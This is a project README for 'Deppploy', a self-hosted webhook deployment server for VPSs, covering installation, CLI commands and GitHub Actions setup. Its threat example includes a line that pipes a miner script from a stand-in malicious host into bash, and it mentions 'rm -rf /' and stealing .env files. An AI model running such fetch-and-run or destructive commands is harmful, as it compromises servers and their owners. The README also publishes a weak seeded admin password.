<div align="center">

# 🚀 Deppploy

### Zero-Trust, Self-Hosted CI/CD Deployment Server & Webhook Daemon for VPS

[![Node.js Version](https://img.shields.io/badge/node-%3E%3D22.18.0-brightgreen.svg?style=flat-square&logo=node.js)](https://nodejs.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](LICENSE)
[![NestJS](https://img.shields.io/badge/NestJS-12.x-ea2845.svg?style=flat-square&logo=nestjs)](https://nestjs.com/)
[![React](https://img.shields.io/badge/React-19.x-61dafb.svg?style=flat-square&logo=react)](https://react.dev/)
[![Prisma](https://img.shields.io/badge/Prisma-8.x-2D3748.svg?style=flat-square&logo=prisma)](https://www.prisma.io/)
[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-16%2B-4169e1.svg?style=flat-square&logo=postgresql)](https://www.postgresql.org/)
[![UI Theme](https://img.shields.io/badge/Theme-VS%20Code%20Dark-007acc.svg?style=flat-square&logo=visualstudiocode)](https://code.visualstudio.com/)

<p align="center">
  <b>Stop granting external CI/CD runners unrestricted SSH access to your servers.</b><br/>
  Deppploy executes <i>only</i> administrator-whitelisted commands behind secure 256-bit webhook tokens.
</p>

[Quick Start](#-quick-start) •
[Why Deppploy?](#-why-deppploy-the-appleboy-vulnerability-fix) •
[Installation](#-installation) •
[CLI Commands](#-cli-commands) •
[GitHub Actions Setup](#-replacing-appleboy-in-github-actions) •
[VS Code Dark UI](#-built-in-vs-code-dark-ui)

</div>

---

## 🛡️ Why Deppploy? The Appleboy Vulnerability Fix

Most development teams deploy to a VPS using GitHub Actions with `appleboy/ssh-action` or raw SSH private keys:

```yaml
# ❌ DANGEROUS: Grants full remote execution to whoever can modify workflow files
- name: Deploy via Appleboy SSH
  uses: appleboy/ssh-action@master
  with:
    host: ${{ secrets.VPS_HOST }}
    username: ubuntu
    key: ${{ secrets.SSH_PRIVATE_KEY }}
    script: |
      # If an attacker compromises your repo or injects code in a PR:
      curl -sSL https://malicious-site.com/miner.sh | bash
```

### The Problem:
1. **Unrestricted Remote Code Execution (RCE)**: Any collaborator with commit/PR permissions to your YAML files can run `rm -rf /`, steal `.env` files, read database passwords, or install crypto miners on your server.
2. **Leaked Private Keys**: Storing root or sudo-capable SSH private keys in GitHub repository secrets exposes your entire server if repository secrets are leaked.
3. **Audit Blindspots**: SSH commands executed in background sessions leave minimal traceability when things go wrong.

---

### How Deppploy Solves This:

```
┌─────────────────────────┐          Webhook POST (Token only)          ┌───────────────────────────────────┐
│  GitHub Actions / CI    │ ──────────────────────────────────────────► │  Deppploy Server (Private on VPS) │
│  (No SSH Keys stored)   │                                             │  (Runs on 127.0.0.1:4444)         │
└─────────────────────────┘                                             └─────────────────┬─────────────────┘
                                                                                          │
                                                                   Executes ONLY pre-approved commands
                                                                   configured in PostgreSQL by Admin
                                                                                          ▼
                                                                        ┌───────────────────────────────────┐
                                                                        │  Safe App Directory (/var/www/..) │
                                                                        │  git pull && pnpm build && pm2 ...│
                                                                        └───────────────────────────────────┘
```

1. **Zero Arbitrary Execution**: External services only ping a webhook URL with an authenticated App Secret token (`POST /:secret/:action`). They **cannot** pass shell strings or arguments.
2. **Administrator-Controlled Whitelist**: Only commands pre-configured in the local PostgreSQL database by the server admin can ever run.
3. **Execution Sandbox**: Commands run exclusively inside the application's designated working directory (`cwd`), with timeout limits and concurrency locks.
4. **Complete Audit Trail**: Every deployment execution captures timestamps, exit codes, trigger IP, stdout, and stderr with one-click log inspection and log purging.

---

## 📦 Installation

You can install Deppploy globally via Git + npm, from source, or via the npm registry.

### Option A: Install directly via Git & NPM (Recommended)

No waiting for registry releases — install directly from the GitHub repository into your global environment:

```bash
npm install -g git+https://github.com/Jisan901/Deppploy.git
```

Verify installation:
```bash
deppploy --version
deppploy --help
```

---

### Option B: Clone & Build from Source

```bash
# 1. Clone repository
git clone https://github.com/Jisan901/Deppploy.git
cd Deppploy

# 2. Install dependencies & build bundles (React UI + NestJS server)
npm install
npm run build:all

# 3. Link globally
npm link
```

---

### Option C: Install via NPM Registry

*(Available once published to npm)*

```bash
npm install -g deppploy
```

Or run on-the-fly with zero permanent installation:
```bash
npx deppploy start --port 4444 --host 127.0.0.1
```

---

## 🚀 Quick Start

### 1. Database Setup
Deppploy requires a PostgreSQL database (version 14, 15, or 16+). Create a database for Deppploy:

```sql
CREATE DATABASE deppploy;
```

Connection URL format:
```text
postgresql://<username>:<password>@<host>:<port>/deppploy
```

---

### 2. Start the Server

#### Background Daemon Mode (Recommended for VPS)
Runs detached in the background, logging to `~/.deppploy/logs/deppploy.log`:

```bash
deppploy start --daemon --port 4444 --host 127.0.0.1 --db "postgresql://postgres:password@localhost:5432/deppploy"
```

#### Foreground Mode (For local development or Docker)
```bash
deppploy start --port 4444 --host 127.0.0.1
```

---

### 3. Check Server Status

```bash
deppploy status
```

Output:
```text
● Deppploy is ONLINE
  PID:         86740
  Address:     http://127.0.0.1:4444
  Admin UI:    http://127.0.0.1:4444/admin
  Uptime:      1.2h (started 11/23/2026, 12:00:00 AM)
  Logs:        /home/ubuntu/.deppploy/logs/deppploy.log
  Applications: 2 registered (2 active)
  Deployments:  14 passed, 0 failed

ℹ Private Access Mode: Server is bound to loopback (127.0.0.1).
  To access remotely from your local machine via SSH tunnel:
  ssh -N -L 4444:127.0.0.1:4444 <user>@<vps-ip>
```

---

### 4. Secure Remote Access (SSH Port Forwarding)

> [!IMPORTANT]
> To prevent public port scanners and automated crawlers from probing your deployment dashboard, bind Deppploy to `127.0.0.1:4444` on your VPS.

From your local machine, open an SSH tunnel:

```bash
# Using the built-in tunnel shortcut:
deppploy tunnel ubuntu@your-vps-ip

# Or using native SSH:
ssh -N -L 4444:127.0.0.1:4444 ubuntu@your-vps-ip
```

Then open your browser to:
👉 **[http://localhost:4444/admin](http://localhost:4444/admin)**

---

## 🔑 Default Administrator Credentials

When initialized for the first time, Deppploy seeds a default administrative account:

| Field | Value |
|---|---|
| **URL** | `http://localhost:4444/admin` (or through SSH port forwarding) |
| **Email** | `admin@deppploy.local` |
| **Password** | `admin123456` |

> [!TIP]
> **Change your password immediately after logging in** by clicking the Key icon (`🔑 admin@deppploy.local`) in the top navigation bar.

---

## 💻 CLI Commands Reference

| Command | Description |
|---|---|
| `deppploy start` | Starts the Deppploy deployment server (foreground) |
| `deppploy start --daemon` | Starts the server as a background daemon process |
| `deppploy start -p 4444 -h 127.0.0.1` | Starts server with custom port and host interface |
| `deppploy status` | Displays live server health, PID, address, uptime & stats |
| `deppploy stop` | Gracefully shuts down the running daemon |
| `deppploy restart` | Restarts the background daemon |
| `deppploy logs` | Displays the last 50 lines of daemon output |
| `deppploy logs -f` | Follows the real-time log output stream live (`tail -f`) |
| `deppploy logs -n 150` | Displays the last 150 lines of logs |
| `deppploy tunnel <user@host>` | Connects an SSH tunnel for remote private access |
| `deppploy --version` | Outputs the current CLI version |
| `deppploy --help` | Displays command assistance and option flags |

---

## 📡 Replacing Appleboy in GitHub Actions

In your project repository, create or update `.github/workflows/deploy.yml`:

```yaml
name: Production Deployment

on:
  push:
    branches:
      - main

jobs:
  deploy:
    name: Trigger VPS Deployment
    runs-on: ubuntu-latest

    steps:
      - name: Send Secure Deployment Webhook
        run: |
          curl -sS -X POST "${{ secrets.DEPPLOY_SERVER_URL }}/${{ secrets.DEPPLOY_APP_SECRET }}/deploy" \
            -H "Content-Type: application/json" \
            -d '{
              "ref": "${{ github.ref }}",
              "sha": "${{ github.sha }}",
              "actor": "${{ github.actor }}"
            }'
```

### GitHub Secrets to Add:
- `DEPPLOY_SERVER_URL`: Your server's URL (e.g., `https://deploy.yourdomain.com` or local tunnel endpoint).
- `DEPPLOY_APP_SECRET`: The 256-bit secret token generated in the Deppploy dashboard (e.g. `dep_sec_55c8f2f03c47d69c5c5a2498...`).

---

## 🎨 Built-in VS Code Dark UI

Deppploy features an integrated dashboard inspired by the authentic **VS Code Dark Modern** theme:

- **Integrated Code Editor**: Syntax highlighting powered by a true AST tokenizer (`prismjs`) for Shell Scripts, YAML workflows, JSON environment variables, and raw log streams.
- **One-Click Presets**: Pre-configured templates for NestJS (PM2), React (Vite/Nginx), Node.js services, and Docker Compose apps.
- **256-bit Cryptographic Secrets**: Instant token rotation with masked display and copy shortcuts.
- **Audit Logs Cleaner**: Filter by application, inspect stdout/stderr per execution, or purge execution history with one click.
- **Password Manager**: Built-in modal to securely change your administrator password.

---

## ⚙️ Environment Variables

Deppploy automatically reads from `.env` in the current working directory, or `~/.deppploy/.env`, or standard process environment variables:

| Variable | Default | Description |
|---|---|---|
| `PORT` | `4444` | Server listening port |
| `HOST` | `127.0.0.1` | Network interface (`127.0.0.1` for private loopback, `0.0.0.0` for public) |
| `DATABASE_URL` | - | PostgreSQL connection URL |
| `JWT_SECRET` | auto-generated | Secret key used for signing administrative JWT session tokens |
| `NODE_ENV` | `production` | Node runtime environment |

---

## 🛠️ Tech Stack Under the Hood

- **Server Core**: [NestJS 12](https://nestjs.com/) (Fast, modular TypeScript backend)
- **Database Layer**: [Prisma 8](https://www.prisma.io/) + [PostgreSQL](https://www.postgresql.org/) (Strict schema contracts and migrations)
- **Frontend Dashboard**: [React 19](https://react.dev/) + [Vite](https://vitejs.dev/) + [Tailwind CSS](https://tailwindcss.com/) + [Lucide Icons](https://lucide.dev/)
- **Syntax Highlighting**: [PrismJS](https://prismjs.com/) with custom VS Code Dark+ color palette
- **CLI Engine**: [Commander.js](https://github.com/tj/commander.js/) with native process daemonization

---

## 🤝 Contributing

Contributions, issues, and feature requests are welcome!

```bash
# 1. Fork repository & clone
git clone https://github.com/Jisan901/Deppploy.git
cd Deppploy

# 2. Install dependencies
npm install

# 3. Start development server with live reload
npm run dev

# 4. In a separate tab, build client assets
npm run build:client
```

---

## 📄 License

Distributed under the **MIT License**. See [LICENSE](LICENSE) for more information.

<div align="center">
  <sub>Built with ❤️ for developers who take VPS security seriously.</sub>
</div>
